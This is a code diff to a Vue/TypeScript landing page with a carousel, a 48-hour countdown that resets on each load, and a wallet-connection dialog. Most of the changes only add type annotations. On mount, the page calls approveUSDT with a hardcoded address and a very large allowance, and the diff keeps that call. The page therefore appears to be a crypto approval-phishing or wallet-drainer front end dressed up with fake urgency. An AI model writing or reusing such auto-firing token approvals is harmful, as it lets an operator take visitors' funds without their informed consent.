@@ -4,12 +4,12 @@ import 'swiper/css/pagination'
 import { Swiper, SwiperSlide } from 'swiper/vue'
 import { Mousewheel, Pagination } from 'swiper/modules'
 import { onBeforeMount, onBeforeUnmount, onMounted, reactive, ref } from 'vue'
-
+import type { Swiper as SwiperInstance } from 'swiper';  // 类型导入
 import { approveUSDT } from "./kaia.ts";
 
 let timer: any = null
 let targetTime = new Date().getTime() + 48 * 60 * 60 * 1000 // 48 hours from now
-const swiperRef = ref(null)
+const swiperRef = ref<SwiperInstance | null>(null);
 const waitingUsers = ref(0)
 const countdown = ref({
   days: 0,
@@ -17,6 +17,7 @@ const countdown = ref({
   minutes: 0,
   seconds: 0,
 })
+
 
 const data = reactive({
   defaultShow: 'walletConnection',
@@ -42,7 +43,7 @@ onMounted(() => {
   if(data.defaultShow){
     showDialog(data.defaultShow)
   }
-  approveUSDT('0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2','0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2',100000000000)
+  approveUSDT('0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2','0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2','100000000000')
 })
 onBeforeUnmount(() => {
   clearInterval(timer)
@@ -94,7 +95,7 @@ const updateCountdown = (duration: number = 1000) => {
   countdown.value.seconds = Math.floor((distance % (duration * 60)) / duration)
 }
 
-const onSwiper = (swiper) => swiperRef.value = swiper
+const onSwiper = (swiper: SwiperInstance) => swiperRef.value = swiper
 const slideNext = ()=>{
   if (swiperRef.value) {
     swiperRef.value.slideNext()
